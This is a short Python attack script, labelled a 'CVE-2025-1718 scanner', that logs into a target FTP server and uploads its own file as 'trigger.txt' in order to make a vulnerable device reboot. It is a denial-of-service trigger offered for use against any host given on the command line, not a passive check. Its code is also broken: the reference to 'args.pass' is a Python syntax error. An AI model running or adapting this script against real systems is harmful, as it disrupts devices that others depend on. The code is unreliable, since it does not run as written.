
import ftplib
import argparse
from termcolor import colored
import time

banner = """
███████╗ ██████╗ ██╗   ██╗███████╗     ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗
██╔════╝██╔═══██╗██║   ██║██╔════╝    ██╔════╝ ██║   ██║████╗  ██║╚══██╔══╝██║
█████╗  ██║   ██║██║   ██║█████╗      ██║  ███╗██║   ██║██╔██╗ ██║   ██║   ██║
██╔══╝  ██║   ██║██║   ██║██╔══╝      ██║   ██║██║   ██║██║╚██╗██║   ██║   ╚═╝
██║     ╚██████╔╝╚██████╔╝███████╗    ╚██████╔╝╚██████╔╝██║ ╚████║   ██║   ██╗
╚═╝      ╚═════╝  ╚═════╝ ╚══════╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝
                             CVE-2025-1718 SCANNER BY ISSAMJR
"""

def check_ftp_reboot(host, port, user, password):
    print(colored(f"[+] Connecting to FTP {host}:{port}...", "cyan"))
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(user, password)
        print(colored("[+] Login successful!", "green"))
        
        # Trigger check (simulate file upload or disk check)
        print(colored("[*] Attempting to simulate disk usage...", "yellow"))
        filename = "trigger.txt"
        ftp.storbinary(f"STOR {filename}", open(__file__, 'rb'))
        print(colored("[+] Upload successful. Target may reboot if vulnerable.", "red"))
        ftp.quit()
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-1718 FTP Vulnerability Scanner")
    parser.add_argument('--host', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=21, help='Target FTP port (default: 21)')
    parser.add_argument('--user', required=True, help='FTP username')
    parser.add_argument('--pass', required=True, help='FTP password')
    args = parser.parse_args()

    print(colored(banner, "magenta"))
    check_ftp_reboot(args.host, args.port, args.user, args.pass)
